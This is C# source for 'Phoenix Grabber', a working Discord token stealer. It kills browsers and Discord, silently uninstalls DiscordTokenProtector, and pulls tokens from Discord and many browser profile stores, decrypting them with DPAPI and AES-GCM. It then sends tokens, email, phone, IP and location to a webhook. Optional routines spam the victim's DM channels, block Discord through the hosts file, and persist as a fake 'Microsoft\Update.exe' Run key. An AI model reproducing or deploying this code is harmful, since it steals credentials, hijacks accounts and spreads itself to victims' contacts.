using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Web.Script.Serialization;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;
using System.Linq;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using System.Text;

namespace Program
{
    static class Program
    {
        #region Main
        static void Main()
        {
            BouncyCastle();
            KillProcesses();
            AntiProtector();
            Start();
            SendInfo();
            //SpreadMode
            //RunOnStartup
            //BlockDiscord
            //FakeError
        }
        #endregion

        #region BouncyCastle
        static void BouncyCastle()
        {
            try
            {
                if (!File.Exists("BouncyCastle.Crypto.dll"))
                {
                    using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("BouncyCastle.Crypto.dll"))
                    using (var file = new FileStream("BouncyCastle.Crypto.dll", FileMode.Create, FileAccess.Write)) { resource.CopyTo(file); }
                    File.SetAttributes("BouncyCastle.Crypto.dll", File.GetAttributes("BouncyCastle.Crypto.dll") | FileAttributes.Hidden);
                }
            }
            catch { }
        }
        #endregion

        #region Start
        static List<string> tokens = new List<string>();

        static void Start()
        {
            List<string> locations = new List<string>();
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            locations.Add(appdata + "\\discord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordcanary\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordptb\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Lightcord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Mozilla\\Firefox\\Profiles");
            locations.Add(localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
            locations.Add(localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            locations.Add(localappdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\");
            foreach (var path in locations)
            {
                if (!Directory.Exists(path)) continue;
                if (path.Contains("Mozilla"))
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles("*.sqlite", SearchOption.AllDirectories))
                    {
                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                        {
                            if (Check(match.Value) == true && !tokens.Contains(match.Value))
                                tokens.Add(match.Value);
                        }
                    }
                }
                else if (path.Contains("cord"))
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles("*.ldb", SearchOption.AllDirectories))
                    {
                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)"))
                        {
                            dynamic deserialize = new JavaScriptSerializer().DeserializeObject(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local State"));
                            AeadParameters parameters = new AeadParameters(new KeyParameter(ProtectedData.Unprotect(Convert.FromBase64String((string)deserialize["os_crypt"]["encrypted_key"]).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser)), 128, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(3).Take(12).ToArray(), null);
                            GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                            cipher.Init(false, parameters);
                            byte[] bytes = new byte[cipher.GetOutputSize(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length)];
                            cipher.DoFinal(bytes, cipher.ProcessBytes(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray(), 0, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length, bytes, 0));
                            string token = Encoding.UTF8.GetString(bytes).TrimEnd("\r\n\0".ToCharArray());
                            if (Check(token) == true && !tokens.Contains(token))
                                tokens.Add(token);
                        }
                    }
                }
                else
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles())
                    {
                        if (file.Equals("LOCK")) continue;
                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                        {
                            if (Check(match.Value) == true && !tokens.Contains(match.Value))
                                tokens.Add(match.Value);
                        }
                    }
                }
            }
        }
        #endregion

        #region Send Info
        static void SendInfo()
        {
            try
            {
                Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Computer Name\",\"value\":\"" + Environment.MachineName + "\"},{\"name\":\"Location\",\"value\":\"" + Location() + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
                if (tokens.Count != 0)
                {
                    foreach (string token in tokens)
                    {
                        var request = Request("/users/@me", "GET", token);
                        dynamic info = new JavaScriptSerializer().DeserializeObject(request);
                        var id = info["id"];
                        if (string.IsNullOrEmpty(id))
                            id = "N/A";
                        var username = info["username"] + "#" + info["discriminator"];
                        if (string.IsNullOrEmpty(username))
                            username = "N/A";
                        var email = info["email"];
                        if (string.IsNullOrEmpty(email))
                            email = "N/A";
                        var phone = info["phone"];
                        if (string.IsNullOrEmpty(phone))
                            phone = "N/A";
                        var request2 = Request("/users/@me/settings", "GET", token);
                        dynamic info2 = new JavaScriptSerializer().DeserializeObject(request2);
                        var status = info2["status"];
                        if (string.IsNullOrEmpty(status))
                            status = "N/A";
                        var creationdate = DateTimeOffset.FromUnixTimeMilliseconds((Convert.ToInt64(id) >> 22) + 1420070400000).DateTime.ToString();
                        Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Username\",\"value\":\"" + username + "\"},{\"name\":\"ID\",\"value\":\"" + id + "\"},{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"},{\"name\":\"Status\",\"value\":\"" + status + "\"},{\"name\":\"Creation Date\",\"value\":\"" + creationdate + "\"},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
                        Thread.Sleep(200);
                    }
                }
            }
            catch { }
        }
        #endregion

        #region Block Discord
        static void BlockDiscord()
        {
            try
            {
                if (!File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts").Contains("discord"))
                {
                    string[] domains = { "discord", "support.discord", "canary.discord", "ptb.discord" };
                    foreach (var domain in domains)
                    {
                        using (StreamWriter writer = File.AppendText(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts"))
                            writer.WriteLine("\n0.0.0.0 " + domain + ".com");
                    }
                }
            }
            catch { }
        }
        #endregion

        #region Location
        static string Location()
        {
            try
            {
                var info = new WebClient().DownloadString("https://www.geodatatool.com/");
                return (((info.Split('\n')[474]).Split('>'))[1]).Split('<')[0] + ", " + (((info.Split('\n')[469]).Split('>'))[1]).Split('<')[0] + ", " + info.Split('\n')[458].Trim();
            }
            catch { return "N/A"; }
        }
        #endregion

        #region Kill Processes
        static void KillProcesses()
        {
            string[] processlist = { "discord", "discordcanary", "discordptb", "lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "chromium-browser", "yandex", "msedge", "brave", "vivaldi", "epic" };
            foreach (Process process in Process.GetProcesses())
            {
                foreach (var name in processlist)
                {
                    if (process.ProcessName.ToLower() == name)
                        process.Kill();
                }
            }
        }
        #endregion

        #region Anti Protector
        static void AntiProtector()
        {
            foreach (Process process in Process.GetProcessesByName("DiscordTokenProtector"))
                process.Kill();

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe"))
            {
                Process process = new Process();
                process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe";
                process.StartInfo.Arguments = "/verysilent";
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.Start();
                process.WaitForExit();
            }
        }
        #endregion

        #region Check
        static bool Check(string token)
        {
            try
            {
                Request("/users/@me", "GET", token);
                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Request
        static string Request(string endpoint, string method, string auth = null, string json = null)
        {
            string text = "";
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            WebRequest request;
            if (auth != null)
            {
                request = WebRequest.Create("https://discord.com/api/v10" + endpoint);
                request.Headers.Add("Authorization", auth);
            }
            else
                request = WebRequest.Create(endpoint);
            request.Method = method;
            if (json == null)
                request.ContentLength = 0;
            else
            {
                request.ContentType = "application/json";
                using (var stream = new StreamWriter(request.GetRequestStream()))
                    stream.Write(json);
            }
            using (var stream = new StreamReader(request.GetResponse().GetResponseStream()))
            {
                text = stream.ReadToEnd();
                stream.Dispose();
            }
            request.Abort();
            return text;
        }
        #endregion

        #region Spread Mode
        static void SpreadMode(string message)
        {
            foreach (var token in tokens)
            {
                try
                {
                    var request = Request("/users/@me/channels", "GET", token);
                    dynamic array = new JavaScriptSerializer().DeserializeObject(request);
                    foreach (dynamic entry in array)
                    {
                        try
                        {
                            Request("/channels/" + entry["id"] + "/messages", "POST", token, "{\"content\":\"" + message + "\"}");
                        }
                        catch { }
                        Thread.Sleep(200);
                    }
                }
                catch { }
            }
        }
        #endregion

        #region IP Address
        static string IP()
        {
            string IP;
            try { IP = new WebClient().DownloadString("http://icanhazip.com/").Trim(); } catch { IP = "N/A"; }
            return IP;
        }
        #endregion

        #region Run On Startup
        static void RunOnStartup()
        {
            try { File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe"); RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); startup.SetValue("Microsoft", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe"); } catch { }
        }
        #endregion
    }
}